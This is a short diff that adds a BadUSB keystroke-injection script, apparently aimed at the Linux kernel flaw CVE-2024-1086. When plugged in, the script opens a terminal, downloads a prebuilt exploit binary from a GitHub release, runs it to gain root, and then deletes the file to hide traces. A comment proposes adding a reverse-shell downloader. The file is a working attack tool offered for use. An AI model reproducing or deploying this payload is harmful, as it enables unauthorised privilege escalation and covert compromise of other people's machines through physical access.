@@ -1,0 +1,19 @@
+REM CVE-2024-1086 BADUSB
+REM Author: ComradeOrion (orionuwu on Gitlab)
+
+DELAY 1000
+
+CTRL-ALT t
+DELAY 250
+
+STRING wget https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit && chmod +x exploit && ./exploit
+ENTER
+DELAY 5500
+
+REM Potentially add a downloader for something like a reverse shell here? :3
+
+STRING rm -rf exploit*
+ENTER
+
+STRING exit
+ENTER
